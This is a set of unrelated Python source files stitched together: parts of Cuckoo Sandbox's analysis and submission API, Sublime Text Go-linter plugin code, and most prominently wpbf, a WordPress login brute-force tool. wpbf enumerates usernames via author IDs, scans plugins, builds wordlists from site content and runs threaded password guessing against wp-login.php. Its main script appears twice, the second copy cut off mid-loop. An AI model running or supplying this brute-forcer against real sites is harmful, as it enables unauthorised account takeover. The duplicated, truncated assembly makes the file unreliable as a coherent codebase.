            process = process[0]

        data = {}                    
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process["summary"]:
                    if category not in data:
                        data[category] = [watcher]
                    else:                    
                        data[category].append(watcher)

        return data                    

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception("missing task_id, watcher, and/or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("supplied pid not found")
        else:                    
            process = process[0]

        summary = process["summary"]

        if watcher not in summary:
            raise Exception("supplied watcher not found")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            "files":
                ["file_opened", "file_read"],
            "registry":
                ["regkey_opened", "regkey_written", "regkey_read"],
            "mutexes":
                ["mutex"],
            "directories":
                ["directory_created", "directory_removed", "directory_enumerated"],
            "processes":
                ["command_line", "dll_loaded"],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """Returns an OrderedDict containing a lists with signatures based on severity"""
        if not task_id:
            raise Exception("missing task_id")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)["signatures"]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature["severity"]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data                    

# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config("cuckoo:cuckoo:machinery")

    if config("routing:vpn:enabled"):
        vpns = config("routing:vpn:vpns")
    else:
        vpns = []

    return {
        "machine": config("%s:%s:machines" % (machinery, machinery)),
        "package": None,
        "priority": 2,
        "timeout": config("cuckoo:timeouts:default"),
        "routing": {
            "route": config("routing:routing:route"),
            "inetsim": config("routing:inetsim:enabled"),
            "tor": config("routing:tor:enabled"),
            "vpns": vpns,
        },
        "options": {
            "enable-services": False,
            "enforce-timeout": False,
            "full-memory-dump": config("cuckoo:cuckoo:memory_dump"),
            "no-injection": False,
            "process-memory-dump": True,
            "simulated-human-interaction": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods(["POST"])
    def presubmit(request):
        files = request.FILES.getlist("files[]")
        data = []

        if files:
            for f in files:
                data.append({
                    "name": f.name,
                    "data": f.file,
                })

            submit_id = submit_manager.pre(submit_type="files", data=data)
            return redirect("submission/pre", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body["type"]

            if submit_type != "strings":
                return json_error_response("type not \"strings\"")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body["data"].split("\n")
            )

            return JsonResponse({
                "status": True,
                "submit_id": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get("submit_id", 0)
        password = body.get("password", None)
        astree = body.get("astree", True)

        data = submit_manager.get_files(                    
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            "status": True,
            "data": data,                    
            "defaults": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop("submit_id", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            "status": True,
            "submit_id": submit_id,
        }, encoder=JsonSerialize)


# Copyright (C) 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

from functools import partial

from anaconda_go.lib import go
from anaconda_go.lib.helpers import get_working_directory                    
from anaconda_go.lib.helpers import get_settings, active_view
from anaconda_go.lib.plugin import anaconda_sublime, Worker, Callback

import sublime as st3_sublime


def run_linter(view=None, hook=None):
    """Wrapper to run the right linter
    """

    if not go.ANAGONDA_PRESENT:
        return

    if get_settings(view, 'anaconda_go_fast_linters_only', False):
        fast_linters(view, hook)
    else:
        all_linters(view, hook)


def fast_linters(view=None, hook=None):
    """Run gometalinter fast linters only
    """

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'fast_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def slow_linters(view=None, hook=None):
    """Run slow gometalinter linters
    """

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'slow_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def all_linters(view=None, hook=None):
    """Run all linters
    """

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'all_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def _get_settings(view):
    return {
        'linters': get_settings(view, 'anaconda_go_linters', []),
        'lint_test': get_settings(
            view, 'anaconda_go_lint_test', False),
        'exclude_regexps': get_settings(
            view, 'anaconda_go_exclude_regexps', []),
        'max_line_length': get_settings(
            view, 'anaconda_go_max_line_length', 120),
        'gocyclo_threshold': get_settings(
            view, 'anaconda_go_gocyclo_threshold', 10),
        'golint_min_confidence': get_settings(
            view, 'anaconda_go_golint_min_confidence', 0.80),
        'goconst_min_occurrences': get_settings(
            view, 'anaconda_go_goconst_min_occurrences', 3),
        'min_const_length': get_settings(
            view, 'anaconda_go_min_const_length', 3),
        'dupl_threshold': get_settings(
            view, 'anaconda_go_dupl_threshold', 50),
        'path': get_working_directory(view)                    
    }


# Copyright (C) 2013 - 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

import os
import sys
import json
import shlex
from subprocess import PIPE

from process import spawn

from .error import AnaGondaError
from .base import AnaGondaContext

_go_get = 'gopkg.in/alecthomas/gometalinter.v1'


class GometaLinterError(AnaGondaError):
    """Fires on GometaLinter errors
    """


class GometaLinter(AnaGondaContext):
    """Context to run gometalinter tool into anaconda_go
    """

    def __init__(self, options, filepath, env_ctx):
        self.filepath = filepath
        self.options = options
        super(GometaLinter, self).__init__(env_ctx, _go_get)

    def __enter__(self):
        """Check binary existence and perform command
        """

        if self._bin_found is None:
            if not os.path.exists(self.binary):
                try:
                    self.go_get()
                    self._install_linters()
                except AnaGondaError:
                    self._bin_found = False
                    raise
            else:
                self._bin_found = True

        if not self._bin_found:
            raise GometaLinterError('{0} not found...'.format(self.binary))

        return self.gometalinter()

    def __exit__(self, *ext):
        """Do nothing
        """

    def gometalinter(self):
        """Run gometalinter and return back a JSON object with it's results
        """

        args = shlex.split(
            '{0} {1}'.format(self.binary, self.options), posix=os.name != 'nt'
        )
        gometalinter = spawn(args, stdout=PIPE, stderr=PIPE, env=self.env)
        out, err = gometalinter.communicate()
        if err is not None and len(err) > 0:
            if sys.version_info >= (3,):
                err = err.decode('utf8')
            raise GometaLinterError(err)

        if sys.version_info >= (3,):
            out = out.decode('utf8')

        return self._normalize(json.loads(out))

    def _install_linters(self):
        """Install gometalinter linters
        """

        args = shlex.split('{0} --install'.format(self.binary))
        gometalinter = spawn(args, stdout=PIPE, stderr=PIPE, env=self.env)
        _, err = gometalinter.communicate()
        if err is not None and len(err) > 0:
            if sys.version_info >= (3,):
                err = err.decode('utf8')
            raise GometaLinterError(err)

    def _normalize(self, metaerrors):
        """Normalize output format to be usable by Anaconda's linting frontend
        """

        errors = []
        for error in metaerrors:
            if self.filepath not in error.get('path', ''):                    
                continue

            error_type = error.get('severity', 'X').capitalize()[0]
            if error_type == 'X':
                continue
            if error_type not in ['E', 'W']:
                error_type = 'V'
            errors.append({
                'underline_range': True,
                'lineno': error.get('line', 0),
                'offset': error.get('col', 0),
                'raw_message': error.get('message', ''),
                'code': 0,
                'level': error_type,
                'message': '[{0}] {1} ({2}): {3}'.format(
                    error_type,
                    error.get('linter', 'none'),
                    error.get('severity', 'none'),
                    error.get('message')
                )
            })

        return errors

    @property
    def binary(self):
        """Return back the binary path
        """

        return os.path.join(self.env['GOPATH'], 'bin', 'gometalinter.v1')


# Copyright (C) 2013 - 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

import logging
import traceback

from ..anagonda.context.autocomplete import AutoComplete
from commands.base import Command


class Gocode(Command):
    """Run GoCode
    """

    def __init__(self, callback, uid, vid, code, path, offset, go_env):                    
        self.vid = vid
        self.path = path
        self.code = code
        self.path = path
        self.offset = offset
        self.go_env = go_env
        super(Gocode, self).__init__(callback, uid)

    def run(self):
        """Run the command
        """

        try:
            with AutoComplete(
                    self.code, self.path, self.offset, self.go_env) as comps:                    
                self.callback({
                    'success': True,
                    'completions': comps,
                    'uid': self.uid,
                    'vid': self.vid
                })
        except Exception as error:
            logging.error(error)
            logging.debug(traceback.format_exc())
            self.callback({
                'success': False,
                'error': str(error),
                'uid': self.uid,
                'vid': self.vid
            })

#!/usr/bin/env python
"""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import logging, logging.config
import urllib2, urlparse
import sys, threading, Queue, time, argparse

import config, wplib, wpworker

if __name__ == '__main__':
    #parse command line arguments
    parser = argparse.ArgumentParser(description='Bruteforce WordPress login form to test password strenght. Currently supports threads, wordlist and basic username detection.')
    parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
    parser.add_argument('-w', '--wordlist', default=config.wordlist, help="worldlist file (default: "+config.wordlist+")")
    parser.add_argument('-nk', '--nokeywords', action="store_false", help="Don't search keywords in content and add them to the wordlist")
    parser.add_argument('-u', '--username', default=config.username, help="username (default: "+str(config.username)+")")
    parser.add_argument('-s', '--scriptpath', default=config.script_path, help="path to the login form (default: "+config.script_path+")")
    parser.add_argument('-t', '--threads', type=int, default=config.threads, help="how many threads the script will spawn (default: "+str(config.threads)+")")
    parser.add_argument('-p', '--proxy', default=None, help="http proxy (ex: http://localhost:8008/)")
    parser.add_argument('-nf', '--nofingerprint', action="store_false", help="Don't fingerprint WordPress")
    parser.add_argument('-eu', '--enumerateusers', action="store_true", help="Only enumerate users (withouth bruteforcing)")
    parser.add_argument('-eut', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help="User ID gap tolerance to use in username enumeration (default: "+str(config.eu_gap_tolerance)+")")
    parser.add_argument('-pl', '--pluginscan', action="store_true", help="Detect plugins in WordPress using a list of popular/vulnerable plugins")
    parser.add_argument('--test', action="store_true", help="Run python doctests (you can use a dummy URL here)")
    args = parser.parse_args()
    config.wp_base_url = args.url
    config.wordlist = args.wordlist
    config.username = args.username
    config.script_path = args.scriptpath
    config.threads = args.threads
    config.proxy = args.proxy
    config.eu_gap_tolerance = args.enumeratetolerance
    if args.test:
        import doctest
        doctest.testmod(wplib)
        exit(0)

    # logger configuration
    logging.config.fileConfig("logging.conf")
    logger = logging.getLogger("wpbf")

    # Wp perform actions over a BlogPress blog
    wp = wplib.Wp(config.wp_base_url, config.script_path, config.proxy)

    logger.info("Target URL: %s", wp.get_base_url())

    # check URL and user (if user not set, enumerate usernames)
    logger.info("Checking URL & username...")
    usernames = []
    if config.username:
        usernames.append(config.username)

    try:
        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
            logger.info("Enumerating users...")
            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)

        if len(usernames) > 0:
            logger.info("Usernames: %s", ", ".join(usernames))
            if args.enumerateusers:
                exit(0)
        else:
            logger.error("Can't find usernames :(")
    except urllib2.HTTPError:
        logger.error("HTTP Error on: %s", wp.get_login_url())
        exit(0)
    except urllib2.URLError:
        logger.error("URL Error on: %s", wp.get_login_url())
        if config.proxy:
            logger.info("Check if proxy is well configured and running")
        exit(0)


    # tasks queue
    task_queue = Queue.Queue()

    # load fingerprint task into queue
    if args.nofingerprint:
        task_queue.put(wpworker.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))

    # load plugin scan tasks into queue
    if args.pluginscan:
        plugins_list = [plugin.strip() for plugin in open(config.plugins_list, "r").readlines()]
        [plugins_list.append(plugin) for plugin in wp.find_plugins()]                    
        logger.info("%s plugins will be tested", str(len(plugins_list)))
        for plugin in plugins_list:
            task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
        del plugins_list

    # check for Login LockDown plugin and load login tasks into tasks queue
    logger.debug("Checking for Login LockDown plugin")
    if wp.check_loginlockdown():
        logger.warning("Login LockDown plugin is active, bruteforce will be useless")
    else:
        # load login check tasks into queue
        logger.debug("Loading wordlist...")
        wordlist = [username.strip() for username in usernames]
        try:
            [wordlist.append(w.strip()) for w in open(config.wordlist, "r").readlines()]
        except IOError:
            logger.error("Can't open '%s' the wordlist will not be used!", config.wordlist)
        logger.debug("%s words loaded from %s", str(len(wordlist)), config.wordlist)
        if args.nokeywords:
            # load into wordlist additional keywords from blog main page
            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
        logger.info("%s passwords will be tested", str(len(wordlist)*len(usernames)))
        for username in usernames:
            for password in wordlist:
                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
        del wordlist

    # start workers
    logger.info("Starting workers...")
    for i in range(config.threads):
        t = wpworker.WpbfWorker(task_queue)
        t.start()

    # feedback to stdout
    while task_queue.qsize() > 0:
        try:
            # poor ETA implementation
            start_time = time.time()
            start_queue = task_queue.qsize()
            time.sleep(10)
            delta_time = time.time() - start_time
            current_queue = task_queue.qsize()
            delta_queue = start_queue - current_queue
            try:
                wps = delta_time / delta_queue
            except ZeroDivisionError:
                wps = 0.6
            print str(current_queue)+" tasks left / "+str(round(1 / wps, 2))+" tasks per second / "+str( round(wps*current_queue / 60, 2) )+"min left"
        except KeyboardInterrupt:
            logger.info("Clearing queue and killing threads...")
            task_queue.queue.clear()
            for t in threading.enumerate()[1:]:
                t.join()

"""
wpbf WordPress library

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This file is part of wpbf.

wpbf is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

wpbf is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with wpbf.  If not, see <http://www.gnu.org/licenses/>.
"""
import urllib, urllib2, re, logging
from random import randint
from urlparse import urlparse

def rm_duplicates(seq):
    """Remove duplicates from a list

    This Function have been made by Dave Kirby and taken from site http://www.peterbe.com/plog/uniqifiers-benchmark

    >>> rm_duplicates([1, 2, 3, 3, 4])
    [1, 2, 3, 4]
    """
    seen = set()
    return [x for x in seq if x not in seen and not seen.add(x)]

def filter_domain(domain):
    """ Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name

    >>> filter_domain("www.dominio.com.ar")
    'dominio'
    """
    words = [".com", "www.", ".ar", ".cl", ".py", ".org", ".net", ".mx", ".bo", ".gob", ".gov", ".edu"]
    for word in words:
        domain = domain.replace(word, "")
    return domain

def get_keywords(data, min_keyword_len=3, min_frequency=2):
    """Get relevant keywords from text

    data            -- Input text to be indexed
    min_keyword_len -- Filter keywords that doesn't have this minimum length
    min_frequency   -- Filter keywords by the number of times than a keyword appear
    """
    words = [w for w in data.split() if len(w) > min_keyword_len]
    keywords = {}
    for word in words:
        if word in keywords:
            keywords[word] += 1
        else:
            keywords[word] = 1

    for keyword, frequency in keywords.copy().iteritems():
        if frequency < min_frequency:
            del keywords[keyword]

    return [k for k, v in keywords.iteritems()]

class Wp:
    """Perform actions on a WordPress Blog.

    Do things in a WordPress blog including login, username check/enumeration, keyword search and plugin detection.

    base_url          -- URL of the blog's main page
    login_script_path -- Path relative to base_url where the login form is located
    proxy             -- URL for a HTTP Proxy
    """
    _base_url = ''
    _login_script_path = ''
    _login_url = ''
    _proxy = None
    _version = None
    _arguments = _keywords = []
    _cache = {}

    def __init__(self, base_url, login_script_path="wp-login.php", proxy=None, *arguments, **keywords):
        # Basic filters for the base url
        self._base_url = base_url
        if self._base_url[0:7] != 'http://':
            self._base_url = 'http://'+self._base_url
        if self._base_url[-1] != '/':
            self._base_url = self._base_url+'/'

        self._login_script_path = login_script_path.lstrip("/")
        self._proxy = proxy
        self._login_url = urllib.basejoin(self._base_url, self._login_script_path)
        self._arguments = arguments
        self._keywords = keywords

        self.logger = logging.getLogger("wpbf")

    # Getters

    def get_login_url(self):
        """Returns login URL"""
        return self._login_url

    def get_base_url(self):
        """Returns base URL"""
        return self._base_url

    def get_version(self):
        """Returns WordPress version"""
        return self._version

    # General methods

    def request(self, url, params=[], cache=False, data=True):
        """Request an URL with a given parameters and proxy

        url    -- URL to request
        params -- dictionary with POST variables
        cache  -- True if you want request to be cached and get a cached version of the request
        data   -- If false, return request object, else return data. Cached data must be retrived with data=True
        """
        if cache and data and self._cache.has_key(url) and len(params) is 0:
            self.logger.debug("Cached %s %s", url, params)
            return self._cache[url]

        request = urllib2.Request(url)
        request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
        if self._proxy:
            proxy_handler = urllib2.ProxyHandler({'http': self._proxy})
            opener = urllib2.build_opener(proxy_handler)
        else:
            opener = urllib2.build_opener()
        self.logger.debug("Requesting %s %s", url, params)
        try:
            response = opener.open(request, urllib.urlencode(params))
            response_data = response.read()
        except urllib2.HTTPError:
            return False                    

        if cache and data and len(params) is 0:
            self._cache[url] = response_data

        if data:
            return response_data

        return response


    # WordPress specific methods

    def login(self, username, password):
        """Try to login into WordPress and see in the returned data contains login errors

        username -- Wordpress username
        password -- Password for the supplied username
        """
        data = self.request(self._login_url, [('log', username), ('pwd', password)])
        if data:
            if "ERROR" in data or "Error" in data or "login_error" in data or "incorrect" in data.lower():
                return False                    
            return True
        return False                    

    def check_username(self, username):
        """Try to login into WordPress and check in the returned data contains username errors

        username -- Wordpress username
        """
        data = self.request(self._login_url, [('log', username), ('pwd', str(randint(1, 9999999)))])
        if data:
            if "ERROR" in data or "Error" in data or "login_error" in data:
                if "usuario es incorrecto" in data or 'usuario no' in data or "Invalid username" in data:
                    return False                    
                return True
        return False                    

    def find_username(self, url=False):
        """Try to find a suitable username searching for common strings used in templates that refers to authors of blog posts

        url   -- Any URL in the blog that can contain author references
        """
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)
        username = None

        regexps = [
            '/author/(.*)"',
            '/author/(.*?)/feed',
            'entries of (.*)"',
            'by (.*) Feed"',
            '(<!-- by (.*?) -->)',
            'View all posts by (.*)"',
        ]

        while username is None and len(regexps):
            regexp = regexps.pop()
            match = re.search(regexp, data, re.IGNORECASE)
            if match:
                username = match.group(1)
                # self.logger.debug("regexp %s marched %s", regexp, username) # uncoment to debug regexps

        if username:
            username = username.strip().replace("/","")
            self.logger.debug("Possible username %s (by content)", username)
            return username
        else:
            return False                    

    def enumerate_usernames(self, gap_tolerance=0):
        """Enumerate usernames

        Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
        WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.

        gap_tolerance -- Tolerance for user id gaps in the user id sequence (this gaps are present when users are deleted and new users created)
        """
        uid = 0
        usernames = []
        gaps = 0
        while gaps <= gap_tolerance:
            try:
                uid = uid + 1
                url = self._base_url+"?author="+str(uid)
                request = urllib2.Request(url)
                request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
                if self._proxy:
                    proxy_handler = urllib2.ProxyHandler({"http": self._proxy})
                    opener = urllib2.build_opener(proxy_handler)
                else:
                    opener = urllib2.build_opener()
                self.logger.debug("Requesting %s", url)
                response = opener.open(request)
                data = response.read()
                self._cache[url] = data     # save response in cache
                parsed_response_url = urlparse(response.geturl())
                response_path = parsed_response_url.path
                # Check for author in redirection
                if 'author' in response_path:
                    # A redirect was made and the username is exposed. The username is the last part of the
                    # response_path (sometimes the response path can contain a trailing slash)
                    if response_path[-1] is "/":
                        username = response_path.split("/")[-2]
                    else:
                        username = response_path.split("/")[-1]
                    self.logger.debug("Possible username %s (by redirect)", username)
                    usernames.append(username)
                    redirect = True
                    gaps = 0

                # Check for author in title
                username_title = self.get_user_from_title(data)
                if username_title and username_title not in usernames:
                    usernames.append(username_title)
                    gaps = 0

                # Check for author in content
                username_content = self.find_username(url)
                if username_content and username_content not in usernames:
                    usernames.append(username_content)
                    gaps = 0

            except urllib2.HTTPError, e:
                self.logger.debug(e)
                gaps += 1

            gaps += 1

        return [user for user in usernames if self.check_username(user)]

    def get_user_from_title(self, content):
        """Fetch the contents of the <title> tag and returns a username (usually, the first word)

        content    -- html content
        last_title -- last title found
        """
        # There was no redirection but the user ID seems to exists (because not 404) so we will
        # try to find the username as the first word in the title
        title_search = re.search("<title>(.*)</title>", content, re.IGNORECASE)
        if title_search:
            title =  title_search.group(1)
            # If the title is the same than the last title requested, or empty, there are no new users
            if (self._cache.has_key('title') and title == self._cache['title']) or ' ' not in title:
                return False                    
            else:
                self._cache['title'] = title
                username = title.split()[0]
                self.logger.debug("Possible username %s (by title)", username)
                return username
        else:
                return False                    

    def find_keywords_in_url(self, min_keyword_len=3, min_frequency=2, ignore_with=False):
        """Try to find relevant keywords within the given URL, keywords will be used in the password wordlist

        min_keyword_len -- Filter keywords that doesn't have this minimum length
        min_frequency   -- Filter keywords number of times than a keyword appears within the content
        ignore_with     -- Ignore words that contains any characters in this list
        """
        data =  self.request(self._base_url, cache=True)
        keywords = []

        # get keywords from title
        title = re.search('<title>(.*)</title>', data, re.IGNORECASE)
        if title:
            title = title.group(1)
            [keywords.insert(0, kw.lower()) for kw in title.split(" ")][:-1]

        # get keywords from url content
        [keywords.append(k.strip()) for k in get_keywords(re.sub("<.*?>", "", data), min_keyword_len, min_frequency)]

        # filter keywords
        keywords = rm_duplicates([k.lower().strip().strip(",").strip("?").strip('"') for k in keywords if len(k) > min_keyword_len])    # min leght
        if ignore_with and len(ignore_with) > 0:        # ignore keywords with certain characters
            for keyword in keywords[:]:
                for i in ignore_with:
                    if i in keyword:
                        keywords.remove(keyword)
                        break

        return keywords

    def check_loginlockdown(self):
        """Check if "Login LockDown" plugin is active (Alip Aswalid)

        url   -- Login form URL
        proxy -- URL for a HTTP Proxy
        """
        data = self.request(self._login_url, cache=True)
        if data and "lockdown" in data.lower():
            return True
        else:
            return False                    

    def check_plugin(self, plugin):
        """Try to fetch WordPress version from "generator" meta tag in main page

        return - WordPress version or false if not found
        """
        url = self._base_url+"wp-content/plugins/"+plugin
        data = self.request(url)
        if data is not False:
            return True
        else:
            return False                    

    def find_plugins(self, url=False):
        """Try to find plugin names from content

        url   -- Any URL in the blog that can contain plugin paths
        """
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)

        plugins = re.findall(r"wp-content/plugins/(.*)/.*\.*\?.*[\'|\"]\w", data, re.IGNORECASE)

        if len(plugins):
            self.logger.debug("Possible plugins %s present", plugins)
            return plugins
        else:
            return False                    

    def fingerprint(self):
        """Try to fetch WordPress version from "generator" meta tag in main page

        return - WordPress version or false if not found
        """
        data = self.request(self._base_url, cache=True)
        m = re.search('<meta name="generator" content="[Ww]ord[Pp]ress (\d\.\d\.?\d?)" />', data)
        if m:
            self._version = m.group(1)
            return self._version
        else:
            return False                    

#!/usr/bin/env python
"""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import logging, logging.config
import urllib2, urlparse
import sys, threading, Queue, time, argparse

import config, wplib, wpworker

if __name__ == '__main__':
    #parse command line arguments
    parser = argparse.ArgumentParser(description='Bruteforce WordPress login form to test password strenght. Currently supports threads, wordlist and basic username detection.')
    parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
    parser.add_argument('-w', '--wordlist', default=config.wordlist, help="worldlist file (default: "+config.wordlist+")")
    parser.add_argument('-nk', '--nokeywords', action="store_false", help="Don't search keywords in content and add them to the wordlist")
    parser.add_argument('-u', '--username', default=config.username, help="username (default: "+str(config.username)+")")
    parser.add_argument('-s', '--scriptpath', default=config.script_path, help="path to the login form (default: "+config.script_path+")")
    parser.add_argument('-t', '--threads', type=int, default=config.threads, help="how many threads the script will spawn (default: "+str(config.threads)+")")
    parser.add_argument('-p', '--proxy', default=None, help="http proxy (ex: http://localhost:8008/)")
    parser.add_argument('-nf', '--nofingerprint', action="store_false", help="Don't fingerprint WordPress")
    parser.add_argument('-eu', '--enumerateusers', action="store_true", help="Only enumerate users (withouth bruteforcing)")
    parser.add_argument('-eut', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help="User ID gap tolerance to use in username enumeration (default: "+str(config.eu_gap_tolerance)+")")
    parser.add_argument('-pl', '--pluginscan', action="store_true", help="Detect plugins in WordPress using a list of popular/vulnerable plugins")
    parser.add_argument('--test', action="store_true", help="Run python doctests (you can use a dummy URL here)")
    args = parser.parse_args()
    config.wp_base_url = args.url
    config.wordlist = args.wordlist
    config.username = args.username
    config.script_path = args.scriptpath
    config.threads = args.threads
    config.proxy = args.proxy
    config.eu_gap_tolerance = args.enumeratetolerance
    if args.test:
        import doctest
        doctest.testmod(wplib)
        exit(0)

    # logger configuration
    logging.config.fileConfig("logging.conf")
    logger = logging.getLogger("wpbf")

    # Wp perform actions over a BlogPress blog
    wp = wplib.Wp(config.wp_base_url, config.script_path, config.proxy)

    logger.info("Target URL: %s", wp.get_base_url())

    # check URL and user (if user not set, enumerate usernames)
    logger.info("Checking URL & username...")
    usernames = []
    if config.username:
        usernames.append(config.username)

    try:
        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
            logger.info("Enumerating users...")
            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)

        if len(usernames) > 0:
            logger.info("Usernames: %s", ", ".join(usernames))
            if args.enumerateusers:
                exit(0)
        else:
            logger.error("Can't find usernames :(")
    except urllib2.HTTPError:
        logger.error("HTTP Error on: %s", wp.get_login_url())
        exit(0)
    except urllib2.URLError:
        logger.error("URL Error on: %s", wp.get_login_url())
        if config.proxy:
            logger.info("Check if proxy is well configured and running")
        exit(0)


    # tasks queue
    task_queue = Queue.Queue()

    # load fingerprint task into queue
    if args.nofingerprint:
        task_queue.put(wpworker.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))

    # load plugin scan tasks into queue
    if args.pluginscan:
        plugins_list = [plugin.strip() for plugin in open(config.plugins_list, "r").readlines()]
        [plugins_list.append(plugin) for plugin in wp.find_plugins()]                    
        logger.info("%s plugins will be tested", str(len(plugins_list)))
        for plugin in plugins_list:
